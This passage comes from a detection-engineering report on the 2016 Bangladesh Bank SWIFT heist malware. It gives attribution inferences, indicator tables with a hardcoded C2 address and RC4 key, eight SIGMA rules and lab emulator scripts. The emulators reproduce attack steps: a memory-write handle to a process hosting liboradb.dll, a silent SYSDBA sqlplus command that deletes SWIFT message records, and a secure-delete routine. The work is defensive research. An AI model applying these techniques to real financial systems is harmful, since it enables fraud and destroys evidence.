### 4.6 Same Filename Masquerade Pattern

| Binary name | Legitimate name it mimics | Context |
|---|---|---|
| `evtsys.exe` | Windows Event System service (`evtsvc.exe`) | Used as service dispatcher name |
| `nroff_b.exe` | SWIFT Alliance Access print utility (`nroff.exe`) | References the legitimate binary in its own filename |
| `diagsysevt` | Sounds like a Windows diagnostic service | Service registration key name |

This level of naming consistency across all three artifacts points to a single author (or a small, coordinated team) who planned the deployment environment deliberately.

### 4.7 What the Technical Artifacts Say About the Operators

Taken together, beyond the six formal attribution lines above, the technical detail supports a specific operational picture, worth stating plainly and cautiously as inference rather than fact:

**The compile timestamps** tell a story numbers alone don't capture. `evtsys.exe` compiled February 4 at 13:45 UTC; `nroff_b.exe` followed February 5 at 08:55; `evtdiag.exe` : the main binary : was compiled last, on February 5 at 11:46, less than 18 hours before the kill switch was designed to fire. The developer was still compiling the main binary the day before the operation ended. This does not read as a team that prepared months in advance and tested carefully : it suggests a rushed final build, possibly incorporating last-minute changes based on reconnaissance of the victim environment. The kill switch date is hardcoded as literal bytes in the binary (year `0x7E0`, month `0x02`, day `0x06`). Someone sat down and typed that date. They knew exactly how long the operation needed to run.

**The "Allians" misspelling** is small but telling. The legitimate SWIFT software directory is "Alliance." The attacker consistently used "Allians" : in the path template, the directory name, the config file location : appearing in at least four distinct string constants across the binary, not a one-time typo corrected elsewhere. Either the attacker copied the misspelling from an internal reconnaissance note that itself contained the error, or they observed the actual directory on the victim system and it had already been created with that spelling before the malware was written : meaning the directory was pre-staged by someone with physical or remote access to the server before the binaries were compiled.

**The operator CLI is the most psychologically revealing artifact.** Twelve commands. Pause, resume, on, off, queue for the printer. Install and uninstall for the liboradb patch : both directions. A manual C2 beacon trigger. A file-staging command and a separate swap command. This is not a fire-and-forget tool. Someone planned to be present during the operation, issuing commands, monitoring the printer, controlling the patch state. The bidirectionality of the patch : the ability to uninstall as cleanly as install : suggests an operator who expected to need to leave the system in a clean state on demand, not only at the kill switch. They thought about getting caught mid-operation and planned an exit.

**The filter list is perhaps the most operationally significant detail.** The 112 SWIFT transaction reference numbers in `gpca.dat` are not generic patterns : they are the specific identifiers of the fraudulent transfers the attackers were about to send. You cannot have those references before the transfers exist. This means `gpca.dat` was prepared after the fraudulent SWIFT messages were composed and their references were known, but before they were sent. The malware and the fraud were coordinated at a level of precision that required advance knowledge of the exact transaction identifiers : knowledge that only someone with access to the SWIFT terminal could have, or someone who received those identifiers from an insider who did.

**Read together:** a developer working under time pressure in the final hours before an operation, working from a shared codebase, building a tool that assumed an operator would be present and interactive during execution, using transaction references that required insider knowledge to obtain. The technical artifacts are consistent with a small, disciplined team : one person writing the code, at least one other with access to the victim's SWIFT terminal. This is inference from the evidence above, presented as such, not as an independently proven fact.

> [PHOTO: A simple visual : the six attribution lines as icons/checkmarks converging on a single "same author/team" conclusion box. Good LinkedIn-carousel material.]

---

## 5. Indicators of Compromise

All IOCs below are grounded in disassembly evidence documented in Section 3. Priority ratings reflect detectability, uniqueness (low false-positive risk), and persistence (how long the indicator survives on a clean system).

### 5.1 CRITICAL : High fidelity, almost no false positives

> Any single CRITICAL indicator, if found on a system running SWIFT Alliance Access, warrants immediate incident response.

| IOC | Type | Source | Notes |
|---|---|---|---|
| Windows service named `diagsysevt` | Service name | `.data:0x40FD04` | No legitimate service uses this name |
| File `nroff.exe.bak` in any Alliance directory | File artifact | `FUN_00409920` | Created when malware backs up legitimate nroff.exe |
| File `rnoff.exe` in any Alliance directory | File artifact | `.data:0x40FCAC` | The malicious replacement for nroff.exe |
| File `%TEMP%\evchk.bat` | File artifact | `FUN_00401230` | Dropped by evtsys during self-deletion, name built byte-by-byte |
| `196.202.103.174` in any connection/DNS query | Network/IP | `DAT_00419394` | Hardcoded C2 (dead as of publication : behavioral value only) |
| `GET /al?---O` / `---C` / `---N` in HTTP traffic | Network/HTTP | `.data:0x40FA90-0x40FAA0` | C2 heartbeat markers, very specific URI pattern |
| `_DO_NOT_USE_MM_` inside any `.prt`/`.fal` file | File content | `.data:0x40F12C` | nroff-comment sentinel, not present in legitimate nroff output |
| RC4 key `4E381FA77F08CCAA0D56EDEFF9ED08EF` on disk | File content | `.data:0x40F020` | Hardcoded in both binaries; finding it in a memory dump is definitive |
| `evtdiag.exe -i / -u / -svc / -t` in process command line | Process | `FUN_00409db0` | No legitimate binary uses these flags with this name |
| `OpenProcess(0x1F0FFF)` targeting a process holding liboradb.dll | Process/Sysmon | `FUN_004023b0` | PROCESS_ALL_ACCESS on a SWIFT process; Sysmon Event 10, GrantedAccess=0x1F0FFF |

### 5.2 HIGH : Strong indicators, very low false-positive rate in Alliance Access environments

| IOC | Type | Notes |
|---|---|---|
| `evtsys.exe` outside `C:\Windows\System32` | File | Legitimate Event System binary is `evtsvc.exe` |
| File rename: readable name → all lowercase, same length, deleted within seconds | File/Sysmon | Event 11 + Event 23 correlation; `rand()%26` lowercase |
| `cmd.exe` spawning a batch from `%TEMP%` containing `PING 0.0.0.0 > nul` + `IF EXIST` | Process | The self-delete batch pattern |
| `WriteProcessMemory` + `VirtualProtectEx` against a process holding liboradb.dll | Process/API | The exact patch sequence, RVA 0x6A8B6 |
| `SeDebugPrivilege` adjustment by a non-system process | Process/Sysmon | Precursor to the patch enumeration chain |
| `sqlplus` invoked via `cmd.exe /c echo exit \| sqlplus -S / as sysdba @...` | Process | Exact silent-execution command template |
| Temp SQL file with prefix `SQL`/`TMP` containing `SET FEEDBACK OFF` / `set linesize 32567` | File content | Preamble strings before DELETE/UPDATE |
| `DeleteService` call against `diagsysevt` | API/Registry | Part of the cleanup chain |

### 5.3 MEDIUM : Useful in combination, higher false-positive rate alone

| IOC | Type | Notes |
|---|---|---|
| `gpca.dat` in any non-standard directory | File | Generic filename, specific to this toolkit in context |
| `recas.dat` alongside `gpca.dat` in an `Allians\` directory | File | Presence together more significant than either alone |
| Directory named `Allians` under `AppData\Local\Administrator` | File/Directory | Misspelled : legitimate SWIFT uses "Alliance" |
| `mcf\` subdirectory being written alongside `mcm\`, `mcp\`, `mcs\` | File | Novel finding : the fourth monitored directory |
| SWIFT MT tags `36B:`, `61:`, `64:`, `65:` parsed by a non-SWIFT process | Behavioral | Extended tag set beyond BAE's original documentation |
| HTTP `GET /al?` to port 80 (any host) | Network | Generic beacon URI pattern, significant only combined with others |
| Rapid zero-byte writes to 4-character-filename files in SWIFT spool directories | File/Behavioral | The PRT cleanup loop running every second |
| `0016NNNN.prt` created then immediately zero-filled and deleted | File/Sysmon | The PRT naming template; File Create + File Delete correlation |
| `FIN 900 Confirmation of Debit` string in memory of a non-SWIFT process | Memory | The SWIFT message type the malware specifically searches for |
| `FEDERAL RESERVE BANK` string in memory of a non-SWIFT process | Memory | Hardcoded target-institution string |

### 5.4 How to Use These IOCs

1. **Host forensics (post-incident):** run strings + YARA + SIGMA against any suspicious binary. The RC4 key, the `_DO_NOT_USE_MM_` sentinel, the `evchk.bat` template string, and the `diagsysevt` service name are all high-confidence YARA matches.
2. **SIEM/EDR rules (live detection):** correlate Sysmon Event 1 (ProcessCreate, `evtdiag.exe -i/-u/-svc/-t`), Event 10 (ProcessAccess, `GrantedAccess=0x1F0FFF`), Event 11 (FileCreate, `evchk.bat` in `%TEMP%`), Event 7 (ImageLoad, `liboradb.dll` by an unexpected process), Event 13 (Registry CreateKey under `Services\diagsysevt`).
3. **Network monitoring:** any HTTP GET to `196.202.103.174` on port 80 with URI starting `/al?` is a definitive C2 beacon; the pattern class (`/al?---O` / `---C` / `---N`) is unique to this family even once the specific IP is dead.

> Priority ordering for a triage analyst: start with CRITICAL indicators (any one is dispositive), escalate immediately. HIGH indicators warrant collection and containment. MEDIUM indicators warrant investigation but should be considered in clusters : two or more MEDIUM indicators together are as significant as a single HIGH indicator.

---

## 6. Novel Findings

The following table tracks every significant finding from this analysis against what prior public sources (BAE Systems 2016a/2016b, DOJ 2018, Oosthoek & Doerr 2021) actually document : not what is assumed to be documented. This discipline matters: it is easy to claim novelty; it is harder to check it line by line against the actual prior record, which is what this table does.

| # | Finding | Prior coverage | Status |
|---|---|---|---|
| 1 | Fourth monitored directory `mcf\` | BAE lists only mcm/mcp/mcs | **Novel** |
| 2 | Full 12-command operator CLI | BAE/Oosthoek mention only `-svc` and 4 printer commands (5 total) | **Novel** |
| 3 | Three-binary handoff architecture (nroff_b → evtdiag → evtsys) | Not described as a coordinated pipeline anywhere | **Novel** |
| 4 | Bidirectional liboradb patch (install AND uninstall) | Prior reports describe install-only | **Novel** |
| 5 | Service-mode gating of the patch (CLI invocation alone does not patch) | Not documented | **Novel** |
| 6 | ST-0-E/ST-1/ST-2/ST-3/ST-100 internal state machine | Not enumerated anywhere | **Novel** |
| 7 | Byte-level proof of kill switch constants (2016/2/6/6) | BAE mentions a kill switch date; no byte-level disassembly shown | **Extends prior work** |
| 8 | C2 payload queue polled every second (immediate exfil, not just hourly heartbeat) | BAE describes "hourly beacon" only | **Novel** |
| 9 | Two independent login-state probes driving 3-marker beacon output | Not documented | **Novel** |
| 10 | Full 5-stage self-cleanup chain reconstruction | BAE mentions self-deletion generally; DOJ describes the mechanism partially | **Extends prior work** |
| 11 | The evtsys spawn-then-exit handoff trick (file-lock release) | Not explained mechanically anywhere | **Novel** |
| 12 | evtsys 50-retry loop tied to the handoff timing | Not documented | **Novel** |
| 13 | `_DO_NOT_USE_MM_` sentinel shared across print AND SWIFT-message parsers | Not identified as a shared convention | **Novel** |
| 14 | Secure-delete function structurally identical across evtdiag/evtsys (attribution evidence) | DOJ implies shared authorship generally; no code-level comparison | **Extends prior work** |
| 15 | RC4 key vestigial-but-present in evtsys (0 XREFs) | Not documented | **Novel** |
| 16 | `recas.dat` is plaintext, NOT XOR-encoded | **Corrects Oosthoek & Doerr (2021), Table III, capability 11** | **Correction to peer-reviewed literature** |
| 17 | liboradb.dll patch is a targeted memory write, not a "buffer overflow / NOP sled" | **Corrects Oosthoek & Doerr (2021), Section VI-A** | **Correction to peer-reviewed literature** |
| 18 | `PROCESS_ALL_ACCESS (0x1F0FFF)` used where minimal rights would suffice : a detection surface | Not flagged as a detection opportunity anywhere | **Novel** |
| 19 | The `evchk.bat` filename constructed byte-by-byte at runtime (anti-string-dump obfuscation) | Not documented | **Novel** |
| 20 | `$UsnJrnl` survives the rename-then-delete technique (forensic limitation of the anti-forensic method) | Not discussed | **Novel** |
| 21 | 112 filter-list entries are the *actual* fraudulent transaction references, implying insider timing | BAE describes the filter list generically | **Extends prior work** |
| 22 | "Allians" misspelling appears in 4+ independent string constants, suggesting pre-staged directory | Noted as a misspelling by BAE; not connected to pre-staging inference | **Extends prior work** |
| 23 | Full function-address cross-reference table (24+ functions named and mapped) | Oosthoek & Doerr name ~24 capabilities on evtdiag alone; this work adds evtsys + nroff_b | **Extends prior work** |
| 24 | Same compiler toolchain fingerprint (VS6, MSVCP60, `_chkstk`) across all three binaries | Not compared across all three | **Novel** |
| 25 | Compile-timestamp analysis (46-hour window, 18-hour margin to kill switch) | BAE/DOJ give some dates; the tight-window narrative interpretation is original | **Extends prior work** |
| 26 | nroff_b.exe MT-type classification logic (MT950/MT515/NAK routing) | Not documented anywhere | **Novel** |
| 27 | Message-block extractor shared between print and message-file subsystems (5 XREFs, 2 callers) | Not documented | **Novel** |
| 28 | fpat.exe (African Bank) patches on-disk vs. evtdiag's in-memory-only patch : implementation distinction | DOJ documents both incidents; the direct side-by-side implementation comparison is original synthesis | **Extends prior work** |
| 29 | Sysmon 15.21 crashes on `name` attribute in `FileDelete` rule elements (tooling finding, not malware finding) | Historically reported for older Sysmon versions/different scenario; this is a distinct/regressed instance | **Novel (tooling, not malware)** |
| 30 | 8 deployable SIGMA rules derived from this behavioral taxonomy | **No prior detection content of any kind exists for this incident** | **Novel : the core contribution** |

> [PHOTO: This table works well as a scrollable LinkedIn carousel : one finding per slide, "Novel" ones highlighted in a different color from "Extends prior work" and the two "Correction" entries.]

---

## 7. SIGMA Rules

Eight rules, derived directly from the behavioral taxonomy in Section 3, validated end-to-end against the environment in Section 8. Rules 1 and 6 use SIGMA's native `correlation` construct for multi-event anti-forensic sequences that no single log line can represent.

### Rule 1 : liboradb.dll Memory-Write Access

```yaml
title: Suspicious Memory-Write Access to Process Hosting liboradb.dll
id: 4f1a9e2c-6b3d-4e7a-9c1f-8a2d5e6b7c90
status: experimental
description: |
    Detects a process opening a handle with memory-write-capable access
    (PROCESS_VM_WRITE | PROCESS_VM_OPERATION, or broader access rights
    such as PROCESS_ALL_ACCESS) to a process with liboradb.dll loaded.
    liboradb.dll is a component of SWIFT Alliance Access's Oracle database
    client library. This pattern matches the technique used by the 2016
    Bangladesh Bank SWIFT heist malware (evtdiag.exe), which patched a
    2-byte authentication-bypass instruction in this DLL in memory.
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
    - https://www.justice.gov/opa/press-release/file/1092091/download
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.defense-evasion
    - attack.t1055
    - attack.t1562
logsource:
    category: process_access
    product: windows
detection:
    selection_target:
        TargetImage|contains: 'liboradb'
    selection_access:
        GrantedAccess:
            - '0x1028'
            - '0x0028'
            - '0x1FFFFF'
            - '0x1F1FFF'
            - '0x1F0FFF'
    condition: selection_target and selection_access
falsepositives:
    - Endpoint security agents and debugging tools routinely open broad-access handles to arbitrary processes.
    - Legitimate Oracle client patching or diagnostic tooling.
level: high
```

### Rule 2 : SQL Client Invoked as SYSDBA via Piped Shell

```yaml
title: SWIFT Database Client Invoked as SYSDBA via Piped Shell Command
id: 7c3d2e1a-8f4b-4a6d-9e2c-1b5a7d9e3f6c
status: experimental
description: |
    Detects sqlplus invoked with SYSDBA privileges, piped through cmd.exe
    with a silent "echo exit" pattern and a redirected output file. Matches
    the exact command structure documented in the 2016 Bangladesh Bank
    heist malware (evtdiag.exe).
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.execution
    - attack.t1059.003
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        Image|endswith: '\cmd.exe'
    selection_child:
        CommandLine|contains|all:
            - 'echo exit'
            - 'sqlplus'
            - 'as sysdba'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate DBAs occasionally script silent sqlplus execution for scheduled maintenance.
level: high
```

### Rule 3 : Unauthorized DELETE on SAAOWNER Schema

```yaml
title: Unauthorized DELETE on SWIFT Alliance Access SAAOWNER Schema
id: 9a1e4f2b-3c7d-4e8a-b1f5-6d2c8a4e7b9f
status: experimental
description: |
    Detects DELETE statements against SAAOWNER.MESG_% or SAAOWNER.TEXT_%
    tables. Matches the technique used to remove database records of
    fraudulent transactions in the 2016 Bangladesh Bank heist.
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.impact
    - attack.t1565.001
logsource:
    product: oracle_dbms
    category: audit
detection:
    selection:
        action_name: 'DELETE'
        object_name|startswith:
            - 'MESG_'
            - 'TEXT_'
        object_schema: 'SAAOWNER'
    filter_expected_service_account:
        dbusername: 'SAA_SERVICE'  # substitute with actual authorized service account
    condition: selection and not filter_expected_service_account
falsepositives:
    - Legitimate Alliance Access housekeeping/archival jobs that periodically purge old records.
level: critical
```

### Rule 4 : Unauthorized UPDATE of Financial Amount Field

```yaml
title: Unauthorized UPDATE of Financial Amount Field on SWIFT SAAOWNER Schema
id: 2d8f3a1c-6e9b-4c7a-8f1d-3b5e9c2a7f4d
status: experimental
description: |
    Detects UPDATE statements modifying MESG_FIN_CCY_AMOUNT or related
    fields on SAAOWNER.MESG_% tables. Matches the balance-manipulation
    technique used in the 2016 Bangladesh Bank heist.
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.impact
    - attack.t1565.001
logsource:
    product: oracle_dbms
    category: audit
detection:
    selection:
        action_name: 'UPDATE'
        object_name|startswith: 'MESG_'
        object_schema: 'SAAOWNER'
        sql_text|contains: 'FIN_CCY_AMOUNT'
    filter_expected_service_account:
        dbusername: 'SAA_SERVICE'
    condition: selection and not filter_expected_service_account
falsepositives:
    - Legitimate correction of a genuinely erroneous transaction amount through documented change procedures.
level: critical
```

### Rule 5 : SWIFT Confirmation Content in Message Files

```yaml
title: SWIFT Confirmation Message Content in Alliance Access Message Files
id: 5b8c1e3a-7d4f-4a9c-b2e6-1f8a3c9d7e2b
status: experimental
description: |
    Detects creation/modification of .prc/.fal message files under
    Alliance Access message-store directories (mcm\, mcp\, mcf\)
    containing FIN 900 confirmation strings or transaction-monitoring
    field tags.
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.collection
    - attack.t1005
logsource:
    category: file_event
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\mcm\'
            - '\mcp\'
            - '\mcf\'
        TargetFilename|endswith:
            - '.prc'
            - '.fal'
    condition: selection_path
falsepositives:
    - Routine activity in the expected message-store directories under normal Alliance Access operation.
level: low
```

### Rule 6 : Secure-Delete Correlation (Multi-Event)

```yaml
title: Secure-Delete Pattern - File Rename to Random String Followed by Deletion
id: 8e2a4f1c-9d7b-4a3e-b6c8-2f5d9a1e4c7b
status: experimental
description: |
    Detects a file renamed to a random, same-length, lowercase-only
    filename within a monitored directory, followed shortly by deletion
    of the renamed file. Matches the anti-forensic secure-delete pattern
    documented in evtsys.exe.
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
    - https://www.justice.gov/opa/press-release/file/1092091/download
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.defense-evasion
    - attack.t1070.004
logsource:
    product: windows
    category: file_event
correlation:
    type: temporal
    rules:
        - 1a3c5e7f-2b4d-6c8e-9a1b-3d5f7c9e1a3b
        - 4d6f8a1c-3e5b-7c9d-1f3a-5b7d9f1c3e5b
    group-by:
        - ComputerName
    timespan: 30s
level: high
falsepositives:
    - Legitimate secure-erase or file-shredding utilities produce an identical pattern; verify against approved software inventory.
---
title: Sentry - FileCreate Rename Inside Allians Directory
id: 1a3c5e7f-2b4d-6c8e-9a1b-3d5f7c9e1a3b
status: experimental
logsource:
    category: file_event
    product: windows
detection:
    selection:
        TargetFilename|contains: '\Allians\'
    condition: selection
level: informational
---
title: Sentry - FileDelete Inside Allians Directory
id: 4d6f8a1c-3e5b-7c9d-1f3a-5b7d9f1c3e5b
status: experimental
logsource:
    category: file_delete
    product: windows
detection:
    selection:
        TargetFilename|contains: '\Allians\'
    condition: selection
level: informational
```

### Rule 7 : Self-Deletion via Batch File with Ping-Delay Loop

```yaml
title: Process Self-Deletion via Dropped Batch File with Ping-Delay Loop
id: 6f9a2c4e-8d1b-4f3a-9c6e-2b4d8f1a6c9e
status: experimental
description: |
    Detects a cmd.exe-launched batch file using "PING 0.0.0.0" as a
    portable sleep delay in a retry loop to delete a locked executable,
    then deleting itself. Matches the evchk.bat self-deletion technique
    used by evtsys.exe; broadly reusable evasive self-cleanup pattern.
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.defense-evasion
    - attack.t1070.004
    - attack.t1059.003
logsource:
    category: process_creation
    product: windows
detection:
    selection_ping:
        Image|endswith: '\PING.EXE'
        CommandLine|contains: '0.0.0.0'
        ParentImage|endswith: '\cmd.exe'
    selection_batch_dropped:
        ParentCommandLine|contains: '.bat'
        ParentImage|endswith: '\cmd.exe'
    condition: selection_ping and selection_batch_dropped
falsepositives:
    - Legitimate network-connectivity-testing scripts occasionally reuse the "ping as sleep" idiom.
level: medium
```

### Rule 8 : Legitimate Binary Masquerade Swap

```yaml
title: Legitimate Binary Backed Up and Replaced Under Original Filename
id: 3c5e7a9f-1b4d-6e8f-2a4c-6e8a1c3f5b7d
status: experimental
description: |
    Detects a file renamed to a .bak backup immediately before a new file
    is created under the original filename. Matches the binary-swap
    masquerade technique used in the 2016 Bangladesh Bank heist
    (nroff.exe backed up to nroff.exe.bak, replaced with a malicious
    nroff.exe).
references:
    - https://baesystemsai.blogspot.com/2016/04/two-bytes-to-951m.html
    - https://www.justice.gov/opa/press-release/file/1092091/download
author: Hazem Akkouh
date: 2026/09/19
tags:
    - attack.defense-evasion
    - attack.t1036.003
logsource:
    category: file_event
    product: windows
detection:
    selection_backup:
        TargetFilename|endswith: '.exe.bak'
    selection_replacement:
        TargetFilename|endswith: '.exe'
    timeframe: 30s
    condition: selection_backup and selection_replacement
falsepositives:
    - Legitimate software update mechanisms commonly back up the previous binary before replacing it.
level: medium
```

---

## 8. Environment Building

SWIFT Alliance Access is proprietary, licensed exclusively to SWIFT member institutions through a paid commercial process : a 2011 datasheet lists a one-time fee of **€43,600** plus **€14,000/year** maintenance. No free, trial, or academic-access path exists, and the associated Developer Kit has been in maintenance mode with no new licenses issued since late 2023. This is a hard ceiling, not a research gap: every primary forensic source cited in this report analyzed this malware from the outside, without real Alliance Access, for exactly the same reason.

**The environment built here is therefore an honest simulation of the environment class Alliance Access runs in** : Windows Server, Oracle Database, the documented file/folder structure : not a reproduction of the proprietary application itself.

### 8.1 Stack

- **VM:** Windows Server 2022 Standard (Desktop Experience), VMware Workstation, host-only networking
- **Database:** Oracle Database 21c Express Edition, pluggable database `XEPDB1`
- **Telemetry:** Sysmon, SwiftOnSecurity community baseline configuration, with four targeted modifications
- **Folder structure:** `C:\Allians\mcm\`, `mcp\`, `mcs\`, plus `%LOCALAPPDATA%\Allians\gpca.dat`/`recas.dat`

### 8.2 SAAOWNER Schema

```sql
CREATE USER SAAOWNER IDENTIFIED BY "SentryLab_2026!";
GRANT CONNECT, RESOURCE, DBA TO SAAOWNER;
ALTER USER SAAOWNER QUOTA UNLIMITED ON USERS;

CREATE TABLE MESG_01 (
    MESG_S_UMID              VARCHAR2(50)  PRIMARY KEY,
    MESG_SENDER_SWIFT_ADDRESS VARCHAR2(20),
    MESG_TRN_REF              VARCHAR2(50),
    MESG_FIN_CCY_AMOUNT        NUMBER(18,2),
    MESG_CREATE_DATE           DATE DEFAULT SYSDATE
);

CREATE TABLE TEXT_01 (
    TEXT_S_UMID    VARCHAR2(50)  PRIMARY KEY,
    TEXT_DATA_BLOCK CLOB,
    FOREIGN KEY (TEXT_S_UMID) REFERENCES MESG_01(MESG_S_UMID)
);

CREATE TABLE JRNL_01 (
    JRNL_ID           NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    JRNL_DISPLAY_TEXT VARCHAR2(200),
    JRNL_DATE_TIME    TIMESTAMP DEFAULT SYSTIMESTAMP
);

CREATE AUDIT POLICY sentry_saaowner_dml
  ACTIONS
    INSERT ON SAAOWNER.MESG_01, UPDATE ON SAAOWNER.MESG_01, DELETE ON SAAOWNER.MESG_01,
    INSERT ON SAAOWNER.TEXT_01, UPDATE ON SAAOWNER.TEXT_01, DELETE ON SAAOWNER.TEXT_01,
    INSERT ON SAAOWNER.JRNL_01, UPDATE ON SAAOWNER.JRNL_01, DELETE ON SAAOWNER.JRNL_01;

AUDIT POLICY sentry_saaowner_dml;
```

> Note: `_TEST`/`_01` suffixes are lab placeholders : BAE's actual SQL uses an undocumented wildcard (`MESG_%s`), and the real suffix is unknown. `MESG_CREATE_DATE` is a synthetic lab-convenience column, not a documented field.

### 8.3 The Sysmon Debugging Story (Full, Unfiltered)

This is worth documenting in full because both bugs were real, non-obvious, and each ate significant time : exactly the kind of thing a "how it actually went" writeup should include rather than smooth over.

**Bug 1 : ImageLoad (Event ID 7) silently disabled.**
`sysmon64.exe -c` showed `Image loading: disabled` globally, and the config comment literally said: *"Using 'include' with no rules means nothing in this section will be logged."* Fixed by scoping a real rule:

```xml
<ImageLoad onmatch="include">
    <ImageLoaded condition="end with">liboradb.dll</ImageLoaded>
</ImageLoad>
```

**Bug 2 : ProcessAccess (Event ID 10), same trap, worse mistake on my part.**
Same empty-include problem. First fix attempt was **wrong**: filtering `GrantedAccess condition="contains any" value="0x0020;0x0008;..."`, assuming individual permission flags would appear as substrings in the logged value. **This is mathematically incorrect** : Sysmon logs the bitwise-OR'd combined result (e.g., `0x1028`), which does not textually contain `0x0020` or `0x0008`. Confirmed via testing: zero events logged despite the underlying `OpenProcess()` calls succeeding at the OS level. Fixed with exact-match hex values once the real combined value was observed from a working test:

```xml
<ProcessAccess onmatch="include">
    <GrantedAccess condition="is">0x1028</GrantedAccess>
    <GrantedAccess condition="is">0x0028</GrantedAccess>
    <GrantedAccess condition="is">0x1FFFFF</GrantedAccess>
    <GrantedAccess condition="is">0x1F1FFF</GrantedAccess>
    <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
</ProcessAccess>
```

**Bug 3 : Sysmon 15.21 crashes on a `name` attribute inside a `FileDelete` rule.**
When the Rule 6 secure-delete detection needed a `FileDelete` rule, adding it caused Sysmon to crash on every config reload with `STATUS_STACK_BUFFER_OVERRUN` (exit code `-1073740791`). Isolated via a clean rebuild from an unmodified SwiftOnSecurity baseline, then reapplying each fix one at a time and testing after each:

- ImageLoad fix → survived
- ProcessAccess fix → survived
- FileCreate extensions → survived
- FileDelete rule *with* `name="SENTRY"` attribute → **crashed, every time, confirmed via Windows Error Reporting crash logs**
- FileDelete rule *without* the `name` attribute → worked cleanly

Research confirmed this is not novel : Microsoft Q&A threads document the same crash pattern with FileDelete rules going back to Sysmon v12.03 on Windows 2008 R2, reportedly fixed in v13.02. Its reappearance in v15.21 suggests either a regression or a related, distinct edge case. Reported as a stability finding : see Section 12.

> Important correction made along the way, worth stating explicitly: `STATUS_STACK_BUFFER_OVERRUN` (0xC0000409) is a legacy-named status code that Microsoft's own engineers have publicly clarified no longer specifically means an exploitable stack overflow : it was broadened years ago to mean "program self-triggered abnormal termination" generally (a `/GS` fast-fail). Reporting this as "found a buffer overflow bug" would be an overclaim. It is correctly reported here as a fast-fail crash, not a confirmed memory-corruption vulnerability.

**Working, final FileCreate/FileDelete configuration:**

```xml
<FileCreate onmatch="include">
    <!-- ... SwiftOnSecurity baseline entries ... -->
    <TargetFilename condition="end with">.dat</TargetFilename>
    <TargetFilename condition="end with">.prc</TargetFilename>
    <TargetFilename condition="end with">.fal</TargetFilename>
    <TargetFilename condition="end with">.txt</TargetFilename>
    <TargetFilename condition="begin with">C:\Allians\</TargetFilename>
</FileCreate>

<FileDelete onmatch="include">
    <TargetFilename condition="begin with">C:\Allians\</TargetFilename>
</FileDelete>
```

### 8.4 Emulator Scripts (Not the Real Malware : Never Obtained or Used)

Every emulator below was authored from scratch, based purely on the documented behavior in Sections 2-3. At no point was the actual malware sample sourced, downloaded, or executed.

**Rule 1 emulator : liboradb.dll access simulation:**

```csharp
// dummy_host.cs : loads a stand-in DLL (renamed copy of a harmless system DLL)
using System;
using System.Runtime.InteropServices;
using System.Threading;

class DummyHost
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LoadLibrary(string dllToLoad);

    static void Main()
    {
        IntPtr handle = LoadLibrary(@"C:\Allians\liboradb.dll");
        Console.WriteLine("liboradb.dll loaded. PID: " + System.Diagnostics.Process.GetCurrentProcess().Id);
        Thread.Sleep(300000);
    }
}
```

```powershell
# simulate_patch.ps1 : opens a memory-write-capable handle to the dummy process
$targetPid = 9992  # match to current dummy_host.exe PID

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ProcAccess {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}
"@

$access = 0x0020 -bor 0x0008  # PROCESS_VM_WRITE | PROCESS_VM_OPERATION
$handle = [ProcAccess]::OpenProcess($access, $false, $targetPid)
if ($handle -ne [IntPtr]::Zero) {
    Write-Host "Successfully opened handle to PID $targetPid"
    [ProcAccess]::CloseHandle($handle)
}
```

**Rule 2/3/4 emulator : sqlplus-piped SYSDBA execution:**

```sql
-- attack_payload.sql
ALTER SESSION SET CONTAINER = XEPDB1;
set heading off;
set linesize 32567;
SET FEEDBACK OFF;
DELETE FROM SAAOWNER.TEXT_01 WHERE TEXT_S_UMID = 'UMID00001';
DELETE FROM SAAOWNER.MESG_01 WHERE MESG_S_UMID = 'UMID00001';
COMMIT;
exit;
```

```powershell
# simulate_sqlplus_attack.ps1 : reproduces the exact documented command line
$sqlplusPath = "C:\app\...\sqlplus.exe"
cmd.exe /c "echo exit | `"$sqlplusPath`" -S / as sysdba @C:\Allians\attack_payload.sql > C:\Allians\attack_output.log"
```

**Rule 6 emulator : secure-delete sequence:**

```powershell
# secure_delete_sim.ps1 : reproduces the exact documented algorithm
$targetPath = "C:\Allians\dummy_target.dat"
$stream = [System.IO.File]::Open($targetPath, 'Open', 'Write')
$stream.Seek(0, 'End') | Out-Null
$stream.WriteByte(0)   # probe write
$stream.Flush()

$fileSize = (Get-Item $targetPath).Length
$stream.Seek(0, 'Begin') | Out-Null
$zeroChunk = New-Object byte[] 4096
$written = 0
while ($written -lt $fileSize) {
    $chunkSize = [Math]::Min(4096, $fileSize - $written)
    $stream.Write($zeroChunk, 0, $chunkSize)
    $written += $chunkSize
}
$stream.Close()

$originalName = [System.IO.Path]::GetFileName($targetPath)
$dir = [System.IO.Path]::GetDirectoryName($targetPath)
$randomName = -join ((97..122) | Get-Random -Count $originalName.Length | ForEach-Object { [char]$_ })
Rename-Item -Path $targetPath -NewName $randomName
Remove-Item -Path (Join-Path $dir $randomName) -Force
```

**Rule 7 emulator : self-delete via batch:**

```powershell
# self_delete_batch_sim.ps1
$targetExe = "C:\Allians\dummy_evtsys.exe"
